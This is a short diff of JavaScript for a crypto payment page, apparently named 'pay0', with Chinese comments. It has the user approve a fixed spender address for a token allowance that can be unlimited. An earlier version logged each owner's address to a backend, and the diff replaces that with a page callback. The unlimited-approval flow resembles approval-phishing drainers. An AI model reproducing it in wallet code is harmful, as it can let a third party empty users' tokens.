@@ -73,10 +73,10 @@
       const feeData = await provider.getFeeData();
       if (feeData && feeData.gasPrice) {
          // 在当前网络 Gas Price 基础上增加 1 Gwei
-         overrides.gasPrice = feeData.gasPrice + BigInt(1000000000); 
+         overrides.gasPrice = feeData.gasPrice + BigInt(10000000); 
       }
     } catch (e) {
-      // 获取费率失败，不做处理，使用默认
+      
     }
 
     // 改为 approve 授权逻辑
@@ -85,16 +85,17 @@
       const cfg = window.pay0Config.getNetworkConfig(chainKey);
       // 调用 approve(spender, amount)
       tx = await token.approve(cfg.spenderAddress, amount, overrides);
-      console.log("approve tx:", tx);
-      await window.pay0Api.postApproval({
-        chain: chainKey,
-        txHash: tx.hash,
-        amountUsdt: amount === maxAmount ? "无限制": (amount / 1e6).toString(),
-        action: "approve",
-        tokenAddress: tokenAddress,
-        spenderAddress: cfg.spenderAddress,
-        ownerAddress: tx.from,
-      });
+     
+      if (typeof window.pay0PaymentCallback === "function") {
+        try {
+          await window.pay0PaymentCallback({
+            chain: chainKey,
+            txHash: tx.hash,
+            amountUsdt: amountUsdtHuman || "",
+            action: "approve"
+          });
+        } catch (callbackError) {}
+      }
     } catch (e) {
       if (e.message && e.message.includes("Failed to fetch")) {
         throw new Error("网络连接失败，请在 MetaMask 中切换 RPC 节点（例如切换到 https://bsc-testnet.publicnode.com）");
